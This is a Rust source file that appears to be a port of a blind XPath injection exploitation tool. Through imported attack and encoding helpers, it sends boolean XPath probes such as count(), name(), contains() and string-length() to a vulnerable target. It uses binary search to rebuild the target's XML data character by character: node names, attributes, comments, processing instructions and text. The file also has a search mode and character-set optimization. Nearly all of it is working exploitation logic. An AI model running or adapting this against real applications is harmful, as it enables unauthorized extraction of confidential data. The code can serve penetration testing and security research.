use std::collections::HashSet;
use std::sync::Arc;

use crate::attack::{attack, encode_payload};
use crate::bst::{get_character_bst, get_count_bst, get_value_bst};
use crate::context::{AttackCtx, Config, XmlState};

/// Default high/low for structure counts (node/attribute/comment counts), matching Python defaults.
const STRUCT_HIGH: i64 = 16;
const STRUCT_LOW: i64 = 0;

/// Wrap an XPath node expression in translate() for case-insensitive matching.
/// Faithfully ports Python's to_lower(), including the uppercase-stripping from the expression.
pub fn to_lower(node: &str, config: &Config) -> String {
    if config.use_lowercase {
        let stripped: String = node.chars().filter(|c| !c.is_ascii_uppercase()).collect();
        format!(
            r#"translate({},"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")"#,
            stripped
        )
    } else {
        node.to_string()
    }
}

/// Compare a node against the set of previously discovered names; returns a match if found.
pub fn match_similar(
    node: &str,
    node_set: &HashSet<String>,
    ctx: &Arc<AttackCtx>,
) -> Option<String> {
    let config = &ctx.config;
    let mut candidates: Vec<String> = node_set.iter().cloned().collect();

    if candidates.len() > 9 {
        let node_expr = if config.normalize_space {
            format!("normalize-space({})", node)
        } else {
            node.to_string()
        };
        let count = get_count_bst(
            &format!("string-length({})", node_expr),
            config.len_high,
            config.len_low,
            ctx,
        ) as usize;
        candidates.retain(|m| m.len() == count);

        if candidates.len() > 9 {
            let mut value = String::new();
            for c in 1..=count {
                let ch = get_character_bst(&node_expr, c, &config.character_set, ctx);
                value.push(ch);
                let prefix = regex::escape(&value);
                candidates.retain(|m| {
                    regex::Regex::new(&format!("^{}", prefix))
                        .map(|r| r.is_match(m))
                        .unwrap_or(false)
                });
                if candidates.len() < 8 {
                    break;
                }
            }
        }
    }

    for candidate in &candidates {
        if attack(&format!("{}='{}'", node, candidate), ctx) {
            return Some(candidate.clone());
        }
    }
    None
}

/// Optimize charset for a specific node by probing which characters are present.
pub fn xml_optimize_character_set_node(
    node: &str,
    chars: &str,
    ctx: &Arc<AttackCtx>,
) -> String {
    let mut present = String::new();
    for c in chars.chars() {
        let cmd = if c == '\'' {
            format!(r#"contains({},"'")"#, node)
        } else {
            format!("contains({},'{}'')", node, c)
        };
        if attack(&encode_payload(&cmd, &ctx.config), ctx) {
            present.push(c);
        }
    }
    present
}

/// Optimize charset globally by checking which characters appear anywhere in the document.
pub fn xml_optimize_character_set(chars: &str, ctx: &Arc<AttackCtx>) -> String {
    let remove = ['\x0b', '\x0c'];
    let chars: String = chars.chars().filter(|c| !remove.contains(c)).collect();

    let mut present = String::new();
    for c in chars.chars() {
        let cmd = if c == '\'' {
            r#"//*[contains(name(),"'")] or //*[contains(.,"'")] or //@*[contains(name(),"'")] or //@*[contains(.,"'")] or //comment()[contains(.,"'")] or //processing-instruction()[contains(.,"'")] or //text()[contains(.,"'")]"#.to_string()
        } else {
            format!(
                "//*[contains(name(),'{c}')] or //*[contains(.,'{c}')] or //@*[contains(name(),'{c}')] or //@*[contains(.,'{c}')] or //comment()[contains(.,'{c}')] or //processing-instruction()[contains(.,'{c}')] or //text()[contains(.,'{c}')]",
                c = c
            )
        };
        if attack(&encode_payload(&cmd, &ctx.config), ctx) {
            present.push(c);
        }
    }

    eprintln!(
        "### Match set optimized from {} to {} characters: {:?} ###",
        chars.len(),
        present.len(),
        present
    );
    present
}

/// Retrieve root-level metadata (comment/PI counts) and optionally emit them.
pub fn get_xml_details(ctx: &Arc<AttackCtx>, state: &mut XmlState) -> String {
    let config = &ctx.config;
    let mut xml_content = String::new();

    state.root_nodes = get_count_bst("count(/*)", STRUCT_HIGH, STRUCT_LOW, ctx);
    state.root_comments = get_count_bst("count(/comment())", STRUCT_HIGH, STRUCT_LOW, ctx);
    state.root_instructions =
        get_count_bst("count(/processing-instruction())", STRUCT_HIGH, STRUCT_LOW, ctx);

    if config.global_count {
        state.nodes_total = get_count_bst("count(//*)", STRUCT_HIGH, STRUCT_LOW, ctx);
        state.attributes_total = get_count_bst("count(//@*)", STRUCT_HIGH, STRUCT_LOW, ctx);
        state.comments_total =
            get_count_bst("count(//comment())", STRUCT_HIGH, STRUCT_LOW, ctx);
        state.instructions_total = get_count_bst(
            "count(//processing-instruction())",
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        state.text_total = get_count_bst("count(//text())", STRUCT_HIGH, STRUCT_LOW, ctx);
        state.elements_total = state.nodes_total
            + state.attributes_total
            + state.comments_total
            + state.text_total;
        println!(
            "### XML Details: Root Nodes: {}, Root Comments: {}, Root Instructions: {}, \
             Total Nodes: {}, Attributes: {}, Comments: {}, Instructions: {}, Text: {}, Total: {} ###",
            state.root_nodes,
            state.root_comments,
            state.root_instructions,
            state.nodes_total,
            state.attributes_total,
            state.comments_total,
            state.instructions_total,
            state.text_total,
            state.elements_total
        );
    }

    if config.no_root {
        return xml_content;
    }

    if !config.no_comments {
        for c in 1..=(state.root_comments.max(0) as usize) {
            state.comments_total -= 1;
            let comment = get_value_bst(&format!("/comment()[{}]", c), None, ctx);
            xml_content.push_str(&format!("<!--{}-->", comment));
            print!("<!--{}-->", comment);
        }
    }

    if !config.no_processor {
        for i in 1..=(state.root_instructions.max(0) as usize) {
            state.instructions_total -= 1;
            let instruction =
                get_value_bst(&format!("/processing-instruction()[{}]", i), None, ctx);
            xml_content.push_str(&format!("<?{}?>", instruction));
            print!("<?{}?>", instruction);
        }
    }

    xml_content
}

/// Recursively traverse an XML tree, returning the raw XML string and printing to stdout.
pub fn get_xml_bst(node: &str, ctx: &Arc<AttackCtx>, state: &mut XmlState) -> String {
    let config = &ctx.config;
    let mut xml_content = String::new();

    if state.nodes_total == 0 {
        return xml_content;
    }

    // Node name
    let node_name = if config.xml_match {
        match_similar(&format!("name({})", node), &state.node_names.clone(), ctx)
            .unwrap_or_else(|| {
                let name = get_value_bst(&format!("name({})", node), None, ctx);
                state.node_names.insert(name.clone());
                name
            })
    } else {
        let name = get_value_bst(&format!("name({})", node), None, ctx);
        state.node_names.insert(name.clone());
        name
    };

    xml_content.push_str(&format!("<{}", node_name));
    print!("<{}", node_name);

    // Attributes
    if !config.no_attributes {
        let attribute_count = if state.attributes_total != 0 {
            get_count_bst(&format!("count({}/@*)", node), STRUCT_HIGH, STRUCT_LOW, ctx)
        } else {
            0
        };
        for a in 1..=(attribute_count.max(0) as usize) {
            state.attributes_total -= 1;

            let attr_name = if config.xml_match {
                match_similar(
                    &format!("name({}/@*[{}])", node, a),
                    &state.attribute_names.clone(),
                    ctx,
                )
                .unwrap_or_else(|| {
                    let name = get_value_bst(&format!("name({}/@*[{}])", node, a), None, ctx);
                    state.attribute_names.insert(name.clone());
                    name
                })
            } else {
                let name = get_value_bst(&format!("name({}/@*[{}])", node, a), None, ctx);
                state.attribute_names.insert(name.clone());
                name
            };

            if !config.no_values {
                let attr_value = get_value_bst(&format!("{}/@*[{}]", node, a), None, ctx);
                xml_content.push_str(&format!(r#" {}="{}""#, attr_name, attr_value));
                print!(r#" {}="{}""#, attr_name, attr_value);
            } else {
                xml_content.push_str(&format!(" {}", attr_name));
                print!(" {}", attr_name);
            }
        }
    }
    xml_content.push('>');
    print!(">");

    // Comments
    if !config.no_comments {
        let comment_count = if state.comments_total != 0 {
            get_count_bst(
                &format!("count({}/comment())", node),
                STRUCT_HIGH,
                STRUCT_LOW,
                ctx,
            )
        } else {
            0
        };
        for c in 1..=(comment_count.max(0) as usize) {
            state.comments_total -= 1;
            let comment = get_value_bst(&format!("{}/comment()[{}]", node, c), None, ctx);
            xml_content.push_str(&format!("<!--{}-->", comment));
            print!("<!--{}-->", comment);
        }
    }

    // Processing instructions
    if !config.no_processor {
        let instr_count = if state.instructions_total != 0 {
            get_count_bst(
                &format!("count({}/processing-instruction())", node),
                STRUCT_HIGH,
                STRUCT_LOW,
                ctx,
            )
        } else {
            0
        };
        for i in 1..=(instr_count.max(0) as usize) {
            state.nodes_total -= 1;
            state.instructions_total -= 1;
            let instruction = get_value_bst(
                &format!("{}/processing-instruction()[{}]", node, i),
                None,
                ctx,
            );
            xml_content.push_str(&format!("<?{}?>", instruction));
            print!("<?{}?>", instruction);
        }
    }

    // Children (recursive)
    if !config.no_child {
        let child_count = if state.nodes_total != 0 {
            get_count_bst(&format!("count({}/*)", node), STRUCT_HIGH, STRUCT_LOW, ctx)
        } else {
            0
        };
        for c in 1..=(child_count.max(0) as usize) {
            let child_xml = get_xml_bst(&format!("{}/*[{}]", node, c), ctx, state);
            xml_content.push_str(&child_xml);
            state.nodes_total -= 1;
        }
    }

    // Text nodes
    if !config.no_text {
        let text_count = if state.text_total != 0 {
            get_count_bst(&format!("count({}/text())", node), STRUCT_HIGH, STRUCT_LOW, ctx)
        } else {
            0
        };
        for t in 1..=(text_count.max(0) as usize) {
            state.text_total -= 1;
            let text = get_value_bst(&format!("{}/text()[{}]", node, t), None, ctx);
            if text.chars().any(|c| !c.is_whitespace()) {
                xml_content.push_str(&text);
                print!("{}", text.replace('\n', ""));
            }
        }
    }

    xml_content.push_str(&format!("</{}>", node_name));
    print!("</{}>", node_name);

    xml_content
}

/// Search for a string across all node types in the document.
pub fn xml_search(search_str: &str, ctx: &Arc<AttackCtx>) {
    let config = &ctx.config;
    let match_fn = if config.search_start {
        "starts-with"
    } else {
        "contains"
    };

    // Build the quoted search string, lowercasing if requested
    let (str_arg, name_node, node_expr) = if config.use_lowercase {
        let lower = format!("'{}'", search_str.to_lowercase());
        println!("# Converting search string to lowercase {} #", lower);
        let nn = r#"translate(name(),"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")"#;
        let ne = r#"translate(.,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")"#;
        (lower, nn.to_string(), ne.to_string())
    } else {
        let s = format!("'{}'", search_str);
        (s, "name(.)".to_string(), ".".to_string())
    };

    if !config.no_child {
        let node_count = get_count_bst(
            &format!("count(//*[{}({},{})])", match_fn, name_node, str_arg),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!("### Found {} in {} node name(s) ###", str_arg, node_count);
        for n in 1..=(node_count.max(0) as usize) {
            let name = get_value_bst(
                &format!(
                    "(name((//*[{}({},{})])[{}]))",
                    match_fn, name_node, str_arg, n
                ),
                None,
                ctx,
            );
            println!("{}", name);
        }
    }

    if !config.no_attributes {
        let attr_count = get_count_bst(
            &format!("count(//@*[{}({},{})])", match_fn, name_node, str_arg),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!(
            "### Found {} in {} attribute name(s) ###",
            str_arg, attr_count
        );
        for a in 1..=(attr_count.max(0) as usize) {
            let attr_name = get_value_bst(
                &format!(
                    "(name((//@*[{}({},{})])[{}]))",
                    match_fn, name_node, str_arg, a
                ),
                None,
                ctx,
            );
            let attr_value = get_value_bst(
                &format!("(//@*[{}({},{})])[{}]", match_fn, name_node, str_arg, a),
                None,
                ctx,
            );
            println!("{}=\"{}\"", attr_name, attr_value);
        }
    }

    if !config.no_values {
        let attr_count = get_count_bst(
            &format!("count(//@*[{}({},{})])", match_fn, node_expr, str_arg),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!(
            "### Found {} in {} attribute value(s) ###",
            str_arg, attr_count
        );
        for a in 1..=(attr_count.max(0) as usize) {
            let attr_name = get_value_bst(
                &format!(
                    "(name((//@*[{}({},{})])[{}]))",
                    match_fn, node_expr, str_arg, a
                ),
                None,
                ctx,
            );
            let attr_value = get_value_bst(
                &format!("((//@*[{}({},{})])[{}])", match_fn, node_expr, str_arg, a),
                None,
                ctx,
            );
            println!("{}=\"{}\"", attr_name, attr_value);
        }
    }

    if !config.no_comments {
        let comment_count = get_count_bst(
            &format!(
                "count(//comment()[{}({},{})])",
                match_fn, node_expr, str_arg
            ),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!(
            "### Found {} in {} comment(s) ###",
            str_arg, comment_count
        );
        for c in 1..=(comment_count.max(0) as usize) {
            let comment = get_value_bst(
                &format!(
                    "(//comment()[{}({},{})])[{}]",
                    match_fn, node_expr, str_arg, c
                ),
                None,
                ctx,
            );
            println!("<!--{}-->", comment);
        }
    }

    if !config.no_processor {
        let instr_count = get_count_bst(
            &format!(
                "count(//processing-instruction()[{}({},{})])",
                match_fn, node_expr, str_arg
            ),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!(
            "### Found {} in {} instruction(s) ###",
            str_arg, instr_count
        );
        for i in 1..=(instr_count.max(0) as usize) {
            let instruction = get_value_bst(
                &format!(
                    "(//processing-instruction()[{}({},{})])[{}]",
                    match_fn, node_expr, str_arg, i
                ),
                None,
                ctx,
            );
            println!("<?{}?>", instruction);
        }
    }

    if !config.no_text {
        let text_count = get_count_bst(
            &format!("count(//text()[{}({},{})])", match_fn, node_expr, str_arg),
            STRUCT_HIGH,
            STRUCT_LOW,
            ctx,
        );
        println!("### Found {} in {} text(s) ###", str_arg, text_count);
        for t in 1..=(text_count.max(0) as usize) {
            let text = get_value_bst(
                &format!(
                    "(//text()[{}({},{})])[{}]",
                    match_fn, node_expr, str_arg, t
                ),
                None,
                ctx,
            );
            println!("{}", text);
        }
    }
}
